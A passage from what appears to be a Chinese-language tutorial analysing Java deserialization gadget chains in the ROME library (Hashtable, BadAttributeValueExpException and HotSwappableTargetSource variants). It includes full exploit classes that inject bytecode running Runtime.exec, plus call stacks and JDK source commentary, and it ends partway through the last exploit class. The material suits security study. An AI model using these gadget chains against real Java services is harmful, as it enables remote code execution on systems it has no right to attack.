<span class="nl">toString:</span><span class="mi">137</span><span class="o">,</span> <span class="n">ToStringBean</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">syndication</span><span class="o">.</span><span class="na">feed</span><span class="o">.</span><span class="na">impl</span><span class="o">)</span>
<span class="nl">toString:</span><span class="mi">116</span><span class="o">,</span> <span class="n">ToStringBean</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">syndication</span><span class="o">.</span><span class="na">feed</span><span class="o">.</span><span class="na">impl</span><span class="o">)</span>
<span class="nl">beanHashCode:</span><span class="mi">193</span><span class="o">,</span> <span class="n">EqualsBean</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">syndication</span><span class="o">.</span><span class="na">feed</span><span class="o">.</span><span class="na">impl</span><span class="o">)</span>
<span class="nl">hashCode:</span><span class="mi">110</span><span class="o">,</span> <span class="n">ObjectBean</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">syndication</span><span class="o">.</span><span class="na">feed</span><span class="o">.</span><span class="na">impl</span><span class="o">)</span>
<span class="nl">reconstitutionPut:</span><span class="mi">1218</span><span class="o">,</span> <span class="n">Hashtable</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">)</span>
<span class="nl">readObject:</span><span class="mi">1195</span><span class="o">,</span> <span class="n">Hashtable</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">)</span>
<span class="nl">invoke0:</span><span class="o">-</span><span class="mi">1</span><span class="o">,</span> <span class="n">NativeMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">invoke:</span><span class="mi">62</span><span class="o">,</span> <span class="n">NativeMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">invoke:</span><span class="mi">43</span><span class="o">,</span> <span class="n">DelegatingMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">invoke:</span><span class="mi">497</span><span class="o">,</span> <span class="n">Method</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">invokeReadObject:</span><span class="mi">1058</span><span class="o">,</span> <span class="n">ObjectStreamClass</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
<span class="nl">readSerialData:</span><span class="mi">1900</span><span class="o">,</span> <span class="n">ObjectInputStream</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
<span class="nl">readOrdinaryObject:</span><span class="mi">1801</span><span class="o">,</span> <span class="n">ObjectInputStream</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
<span class="nl">readObject0:</span><span class="mi">1351</span><span class="o">,</span> <span class="n">ObjectInputStream</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
<span class="nl">readObject:</span><span class="mi">371</span><span class="o">,</span> <span class="n">ObjectInputStream</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
<span class="nl">main:</span><span class="mi">54</span><span class="o">,</span> <span class="n">HashTableExp</span> <span class="o">(</span><span class="n">RomeSec</span><span class="o">)</span>
</pre></div>
<h3 data-content="1" id="dede5809643e1ee2685bfbefb4558c21">详细分析</h3>
<p>这里和上一条链的区别就是不使用HashMap，选择使用HashTable，但是只要有方法调用了hashCode方法，后面的链就不会发生改变</p>
<p>在HashTable的readObject方法中<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240120124724-016f163c-b74f-1.png"/></p>
<p>进入HashTable的reconstitutionPut方法，这里调用hashCode方法</p>
<div class="highlight"><pre><span></span><span class="c1">// 用于在哈希表中插入新条目的方法</span>
<span class="kd">private</span> <span class="kt">void</span> <span class="nf">reconstitutionPut</span><span class="o">(</span><span class="n">Entry</span><span class="o">&lt;?,?&gt;[]</span> <span class="n">tab</span><span class="o">,</span> <span class="n">K</span> <span class="n">key</span><span class="o">,</span> <span class="n">V</span> <span class="n">value</span><span class="o">)</span>
    <span class="kd">throws</span> <span class="n">StreamCorruptedException</span>
<span class="o">{</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">value</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">throw</span> <span class="k">new</span> <span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">StreamCorruptedException</span><span class="o">();</span>
    <span class="o">}</span>
    <span class="c1">// Makes sure the key is not already in the hashtable.</span>
    <span class="c1">// This should not happen in deserialized version.</span>
    <span class="c1">// 这里</span>
    <span class="kt">int</span> <span class="n">hash</span> <span class="o">=</span> <span class="n">key</span><span class="o">.</span><span class="na">hashCode</span><span class="o">();</span>
    <span class="kt">int</span> <span class="n">index</span> <span class="o">=</span> <span class="o">(</span><span class="n">hash</span> <span class="o">&amp;</span> <span class="mh">0x7FFFFFFF</span><span class="o">)</span> <span class="o">%</span> <span class="n">tab</span><span class="o">.</span><span class="na">length</span><span class="o">;</span>
    <span class="k">for</span> <span class="o">(</span><span class="n">Entry</span><span class="o">&lt;?,?&gt;</span> <span class="n">e</span> <span class="o">=</span> <span class="n">tab</span><span class="o">[</span><span class="n">index</span><span class="o">]</span> <span class="o">;</span> <span class="n">e</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">;</span> <span class="n">e</span> <span class="o">=</span> <span class="n">e</span><span class="o">.</span><span class="na">next</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">if</span> <span class="o">((</span><span class="n">e</span><span class="o">.</span><span class="na">hash</span> <span class="o">==</span> <span class="n">hash</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="n">e</span><span class="o">.</span><span class="na">key</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">key</span><span class="o">))</span> <span class="o">{</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">StreamCorruptedException</span><span class="o">();</span>
        <span class="o">}</span>
    <span class="o">}</span>
    <span class="c1">// Creates the new entry.</span>
    <span class="nd">@SuppressWarnings</span><span class="o">(</span><span class="s">"unchecked"</span><span class="o">)</span>
        <span class="n">Entry</span><span class="o">&lt;</span><span class="n">K</span><span class="o">,</span><span class="n">V</span><span class="o">&gt;</span> <span class="n">e</span> <span class="o">=</span> <span class="o">(</span><span class="n">Entry</span><span class="o">&lt;</span><span class="n">K</span><span class="o">,</span><span class="n">V</span><span class="o">&gt;)</span><span class="n">tab</span><span class="o">[</span><span class="n">index</span><span class="o">];</span>
    <span class="n">tab</span><span class="o">[</span><span class="n">index</span><span class="o">]</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Entry</span><span class="o">&lt;&gt;(</span><span class="n">hash</span><span class="o">,</span> <span class="n">key</span><span class="o">,</span> <span class="n">value</span><span class="o">,</span> <span class="n">e</span><span class="o">);</span>
    <span class="n">count</span><span class="o">++;</span>
<span class="o">}</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240120124744-0d0564c4-b74f-1.png"/><br/>
这里的key为ObjectBean对象，这样就调用了ObjectBean的hashCode方法，接下来的链与上一个链一致</p>
<h2 data-content="1" id="9c1ccd2e5c3deea11c5f53ce62677158">6. BadAttributeValueExpException利用链</h2>
<h3 data-content="1" id="701aaa598d08113016c753a9e5845fed">利用链</h3>
<div class="highlight"><pre><span></span><span class="n">TemplatesImpl</span><span class="o">.</span><span class="na">getOutputProperties</span><span class="o">()</span>
<span class="n">ToStringBean</span><span class="o">.</span><span class="na">toString</span><span class="o">(</span><span class="n">String</span><span class="o">)</span>
<span class="n">ToStringBean</span><span class="o">.</span><span class="na">toString</span><span class="o">()</span>
<span class="n">BadAttributeValueExpException</span><span class="o">.</span><span class="na">readObject</span><span class="o">()</span>
</pre></div>
<h3 data-content="1" id="573178897f043533bf7fa756632a3432">EXP</h3>
<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">RomeSec</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">com.sun.syndication.feed.impl.ToStringBean</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javassist.ClassPool</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javassist.CtClass</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">javax.management.BadAttributeValueExpException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.xml.transform.Templates</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.FileInputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.FileOutputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.ObjectInputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.ObjectOutputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.lang.reflect.Field</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">BadAttrExp</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>
        <span class="n">String</span> <span class="n">AbstractTranslet</span><span class="o">=</span><span class="s">"com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"</span><span class="o">;</span>
        <span class="n">String</span> <span class="n">TemplatesImpl</span><span class="o">=</span><span class="s">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span><span class="o">;</span>

        <span class="c1">// 创建恶意类</span>
        <span class="n">ClassPool</span> <span class="n">classPool</span> <span class="o">=</span> <span class="n">ClassPool</span><span class="o">.</span><span class="na">getDefault</span><span class="o">();</span>
        <span class="n">classPool</span><span class="o">.</span><span class="na">appendClassPath</span><span class="o">(</span><span class="n">AbstractTranslet</span><span class="o">);</span>
        <span class="n">CtClass</span> <span class="n">ctClass</span> <span class="o">=</span> <span class="n">classPool</span><span class="o">.</span><span class="na">makeClass</span><span class="o">(</span><span class="s">"cccc"</span><span class="o">);</span>
        <span class="n">ctClass</span><span class="o">.</span><span class="na">setSuperclass</span><span class="o">(</span><span class="n">classPool</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">AbstractTranslet</span><span class="o">));</span>
        <span class="n">ctClass</span><span class="o">.</span><span class="na">makeClassInitializer</span><span class="o">().</span><span class="na">setBody</span><span class="o">(</span><span class="s">"java.lang.Runtime.getRuntime().exec(\"calc\");"</span><span class="o">);</span>
        <span class="kt">byte</span><span class="o">[]</span> <span class="n">bytes</span> <span class="o">=</span> <span class="n">ctClass</span><span class="o">.</span><span class="na">toBytecode</span><span class="o">();</span>

        <span class="c1">// 创建TemplatesImpl对象</span>
        <span class="n">Object</span> <span class="n">templateImpl</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="n">TemplatesImpl</span><span class="o">).</span><span class="na">getDeclaredConstructor</span><span class="o">(</span><span class="k">new</span> <span class="n">Class</span><span class="o">[]{}).</span><span class="na">newInstance</span><span class="o">();</span>
        <span class="n">setFiled</span><span class="o">(</span><span class="n">templateImpl</span><span class="o">,</span> <span class="s">"_bytecodes"</span><span class="o">,</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[][]{</span><span class="n">bytes</span><span class="o">});</span>
        <span class="n">setFiled</span><span class="o">(</span><span class="n">templateImpl</span><span class="o">,</span> <span class="s">"_name"</span><span class="o">,</span> <span class="s">"test"</span><span class="o">);</span>
        <span class="n">setFiled</span><span class="o">(</span><span class="n">templateImpl</span><span class="o">,</span> <span class="s">"_tfactory"</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>

        <span class="c1">// 创建ToStringBean对象</span>
        <span class="n">ToStringBean</span> <span class="n">toStringBean</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ToStringBean</span><span class="o">(</span><span class="n">Templates</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">templateImpl</span><span class="o">);</span>

        <span class="c1">// 创建BadAttributeValueExpException对象</span>
        <span class="n">BadAttributeValueExpException</span> <span class="n">badAttributeValueExpException</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BadAttributeValueExpException</span><span class="o">(</span><span class="kc">null</span><span class="o">);</span>
        <span class="n">setFiled</span><span class="o">(</span><span class="n">badAttributeValueExpException</span><span class="o">,</span> <span class="s">"val"</span><span class="o">,</span> <span class="n">toStringBean</span><span class="o">);</span>

        <span class="c1">// 序列化</span>
        <span class="n">ObjectOutputStream</span> <span class="n">objectOutputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">FileOutputStream</span><span class="o">(</span><span class="s">"BadAttrExp.bin"</span><span class="o">));</span>
        <span class="n">objectOutputStream</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">badAttributeValueExpException</span><span class="o">);</span>
        <span class="n">objectOutputStream</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>

        <span class="c1">// 反序列化</span>
        <span class="n">ObjectInputStream</span> <span class="n">objectInputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectInputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">FileInputStream</span><span class="o">(</span><span class="s">"BadAttrExp.bin"</span><span class="o">));</span>
        <span class="n">objectInputStream</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
        <span class="n">objectInputStream</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">setFiled</span><span class="o">(</span><span class="n">Object</span> <span class="n">o</span><span class="o">,</span> <span class="n">String</span> <span class="n">fieldname</span><span class="o">,</span> <span class="n">Object</span> <span class="n">value</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
        <span class="n">Field</span> <span class="n">field</span> <span class="o">=</span> <span class="n">o</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="n">fieldname</span><span class="o">);</span>
        <span class="n">field</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="n">field</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">o</span><span class="o">,</span> <span class="n">value</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<h3 data-content="1" id="587e86ec92831f69a6961c450937d069">函数调用栈</h3>
<div class="highlight"><pre><span></span><span class="nl">exec:</span><span class="mi">347</span><span class="o">,</span> <span class="n">Runtime</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">)</span>
<span class="o">&lt;</span><span class="n">clinit</span><span class="o">&gt;:-</span><span class="mi">1</span><span class="o">,</span> <span class="n">cccc</span>
<span class="nl">newInstance0:</span><span class="o">-</span><span class="mi">1</span><span class="o">,</span> <span class="n">NativeConstructorAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">newInstance:</span><span class="mi">62</span><span class="o">,</span> <span class="n">NativeConstructorAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">newInstance:</span><span class="mi">45</span><span class="o">,</span> <span class="n">DelegatingConstructorAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">newInstance:</span><span class="mi">422</span><span class="o">,</span> <span class="n">Constructor</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">newInstance:</span><span class="mi">442</span><span class="o">,</span> <span class="n">Class</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">)</span>
<span class="nl">getTransletInstance:</span><span class="mi">455</span><span class="o">,</span> <span class="n">TemplatesImpl</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">xalan</span><span class="o">.</span><span class="na">internal</span><span class="o">.</span><span class="na">xsltc</span><span class="o">.</span><span class="na">trax</span><span class="o">)</span>
<span class="nl">newTransformer:</span><span class="mi">486</span><span class="o">,</span> <span class="n">TemplatesImpl</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">xalan</span><span class="o">.</span><span class="na">internal</span><span class="o">.</span><span class="na">xsltc</span><span class="o">.</span><span class="na">trax</span><span class="o">)</span>
<span class="nl">getOutputProperties:</span><span class="mi">507</span><span class="o">,</span> <span class="n">TemplatesImpl</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">xalan</span><span class="o">.</span><span class="na">internal</span><span class="o">.</span><span class="na">xsltc</span><span class="o">.</span><span class="na">trax</span><span class="o">)</span>
<span class="nl">invoke0:</span><span class="o">-</span><span class="mi">1</span><span class="o">,</span> <span class="n">NativeMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">invoke:</span><span class="mi">62</span><span class="o">,</span> <span class="n">NativeMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">invoke:</span><span class="mi">43</span><span class="o">,</span> <span class="n">DelegatingMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">invoke:</span><span class="mi">497</span><span class="o">,</span> <span class="n">Method</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">toString:</span><span class="mi">137</span><span class="o">,</span> <span class="n">ToStringBean</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">syndication</span><span class="o">.</span><span class="na">feed</span><span class="o">.</span><span class="na">impl</span><span class="o">)</span>
<span class="nl">toString:</span><span class="mi">116</span><span class="o">,</span> <span class="n">ToStringBean</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">syndication</span><span class="o">.</span><span class="na">feed</span><span class="o">.</span><span class="na">impl</span><span class="o">)</span>
<span class="nl">readObject:</span><span class="mi">86</span><span class="o">,</span> <span class="n">BadAttributeValueExpException</span> <span class="o">(</span><span class="n">javax</span><span class="o">.</span><span class="na">management</span><span class="o">)</span>
<span class="nl">invoke0:</span><span class="o">-</span><span class="mi">1</span><span class="o">,</span> <span class="n">NativeMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">invoke:</span><span class="mi">62</span><span class="o">,</span> <span class="n">NativeMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">invoke:</span><span class="mi">43</span><span class="o">,</span> <span class="n">DelegatingMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">invoke:</span><span class="mi">497</span><span class="o">,</span> <span class="n">Method</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">invokeReadObject:</span><span class="mi">1058</span><span class="o">,</span> <span class="n">ObjectStreamClass</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
<span class="nl">readSerialData:</span><span class="mi">1900</span><span class="o">,</span> <span class="n">ObjectInputStream</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
<span class="nl">readOrdinaryObject:</span><span class="mi">1801</span><span class="o">,</span> <span class="n">ObjectInputStream</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
<span class="nl">readObject0:</span><span class="mi">1351</span><span class="o">,</span> <span class="n">ObjectInputStream</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
<span class="nl">readObject:</span><span class="mi">371</span><span class="o">,</span> <span class="n">ObjectInputStream</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
<span class="nl">main:</span><span class="mi">48</span><span class="o">,</span> <span class="n">BadAttrExp</span> <span class="o">(</span><span class="n">RomeSec</span><span class="o">)</span>
</pre></div>
<h3 data-content="1" id="cc7dd6a86ab8f2aecd0c3a348d566b22">详细分析</h3>
<p>查看BadAttributeValueExpException的readObject方法</p>
<div class="highlight"><pre><span></span><span class="kd">private</span> <span class="kt">void</span> <span class="nf">readObject</span><span class="o">(</span><span class="n">ObjectInputStream</span> <span class="n">ois</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">ClassNotFoundException</span> <span class="o">{</span>
    <span class="c1">// 使用 ObjectInputStream 的 readFields 方法获取反序列化的字段</span>
    <span class="n">ObjectInputStream</span><span class="o">.</span><span class="na">GetField</span> <span class="n">gf</span> <span class="o">=</span> <span class="n">ois</span><span class="o">.</span><span class="na">readFields</span><span class="o">();</span>
    <span class="c1">// 从字段集合中获取名为 "val" 的字段的值</span>
    <span class="n">Object</span> <span class="n">valObj</span> <span class="o">=</span> <span class="n">gf</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"val"</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>

    <span class="k">if</span> <span class="o">(</span><span class="n">valObj</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">val</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
    <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">valObj</span> <span class="k">instanceof</span> <span class="n">String</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">val</span><span class="o">=</span> <span class="n">valObj</span><span class="o">;</span>
    <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">System</span><span class="o">.</span><span class="na">getSecurityManager</span><span class="o">()</span> <span class="o">==</span> <span class="kc">null</span>
            <span class="o">||</span> <span class="n">valObj</span> <span class="k">instanceof</span> <span class="n">Long</span>
            <span class="o">||</span> <span class="n">valObj</span> <span class="k">instanceof</span> <span class="n">Integer</span>
            <span class="o">||</span> <span class="n">valObj</span> <span class="k">instanceof</span> <span class="n">Float</span>
            <span class="o">||</span> <span class="n">valObj</span> <span class="k">instanceof</span> <span class="n">Double</span>
            <span class="o">||</span> <span class="n">valObj</span> <span class="k">instanceof</span> <span class="n">Byte</span>
            <span class="o">||</span> <span class="n">valObj</span> <span class="k">instanceof</span> <span class="n">Short</span>
            <span class="o">||</span> <span class="n">valObj</span> <span class="k">instanceof</span> <span class="n">Boolean</span><span class="o">)</span> <span class="o">{</span>
        <span class="c1">// 重点在这里，调用了toString方法</span>
        <span class="n">val</span> <span class="o">=</span> <span class="n">valObj</span><span class="o">.</span><span class="na">toString</span><span class="o">();</span>
    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span> <span class="c1">// the serialized object is from a version without JDK-8019292 fix</span>
        <span class="n">val</span> <span class="o">=</span> <span class="n">System</span><span class="o">.</span><span class="na">identityHashCode</span><span class="o">(</span><span class="n">valObj</span><span class="o">)</span> <span class="o">+</span> <span class="s">"@"</span> <span class="o">+</span> <span class="n">valObj</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getName</span><span class="o">();</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p>这段代码用于反序列化对象中的字段，并根据字段的类型和值进行处理，而且这里调用了toString方法，符合利用链的要求<br/>
所以只需要将valObj设置为ToStringBean对象即可，根据下面这句代码</p>
<div class="highlight"><pre><span></span><span class="n">Object</span> <span class="n">valObj</span> <span class="o">=</span> <span class="n">gf</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"val"</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
</pre></div>
<p>只需要在构造BadAttributeValueExpException对象的时候，将其val参数设置成ToStringBean对象即可<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240120124810-1cc85790-b74f-1.png"/></p>
<p><strong>注</strong>：这里进入对应的分支是System.getSecurityManager()返回的null，表示当前线程并未设置或安装安全管理器</p>
<h2 data-content="1" id="7b99053b0ba32fa9c3ca7ed4e9866dcc">7. HotSwappableTargetSource利用链</h2>
<h3 data-content="1" id="8e12ebb1588d910ca555dbc6f6b0f37d">环境依赖</h3>
<div class="highlight"><pre><span></span><span class="nt">&lt;dependency&gt;</span>
    <span class="nt">&lt;groupId&gt;</span>org.springframework<span class="nt">&lt;/groupId&gt;</span>
    <span class="nt">&lt;artifactId&gt;</span>spring-aop<span class="nt">&lt;/artifactId&gt;</span>
    <span class="nt">&lt;version&gt;</span>5.2.7.RELEASE<span class="nt">&lt;/version&gt;</span>
<span class="nt">&lt;/dependency&gt;</span>
</pre></div>
<h3 data-content="1" id="39cc99947d87ce780e66e87bb5ca9efc">利用链</h3>
<div class="highlight"><pre><span></span><span class="n">TemplatesImpl</span><span class="o">.</span><span class="na">getOutputProperties</span><span class="o">()</span>
<span class="n">ToStringBean</span><span class="o">.</span><span class="na">toString</span><span class="o">(</span><span class="n">String</span><span class="o">)</span>
<span class="n">ToStringBean</span><span class="o">.</span><span class="na">toString</span>
<span class="n">XString</span><span class="o">.</span><span class="na">equals</span><span class="o">()</span>
<span class="n">HotSwappableTargetSource</span><span class="o">.</span><span class="na">equals</span><span class="o">()</span>
<span class="n">HashMap</span><span class="o">.</span><span class="na">putVal</span><span class="o">()</span>
<span class="n">HashMap</span><span class="o">.</span><span class="na">readObject</span><span class="o">()</span>
</pre></div>
<h3 data-content="1" id="fe5ad7a6b33065e436eb9d9615744648">EXP</h3>
<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">RomeSec</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">com.sun.org.apache.xpath.internal.objects.XString</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">com.sun.syndication.feed.impl.ToStringBean</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javassist.ClassPool</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javassist.CtClass</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.aop.target.HotSwappableTargetSource</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">javax.xml.transform.Templates</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.FileInputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.FileOutputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.ObjectInputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.ObjectOutputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.lang.reflect.Field</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.HashMap</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">HotSwapExp</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>
        <span class="n">String</span> <span class="n">AbstractTranslet</span><span class="o">=</span><span class="s">"com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"</span><span class="o">;</span>
        <span class="n">String</span> <span class="n">TemplatesImpl</span><span class="o">=</span><span class="s">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span><span class="o">;</span>

        <span class="c1">// 创建恶意类</span>
        <span class="n">ClassPool</span> <span class="n">classPool</span> <span class="o">=</span> <span class="n">ClassPool</span><span class="o">.</span><span class="na">getDefault</span><span class="o">();</span>
        <span class="n">classPool</span><span class="o">.</span><span class="na">appendClassPath</span><span class="o">(</span><span class="n">AbstractTranslet</span><span class="o">);</span>
        <span class="n">CtClass</span> <span class="n">ctClass</span> <span class="o">=</span> <span class="n">classPool</span><span class="o">.</span><span class="na">makeClass</span><span class="o">(</span><span class="s">"aaaa"</span><span class="o">);</span>
        <span class="n">ctClass</span><span class="o">.</span><span class="na">setSuperclass</span><span class="o">(</span><span class="n">classPool</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">AbstractTranslet</span><span class="o">));</span>
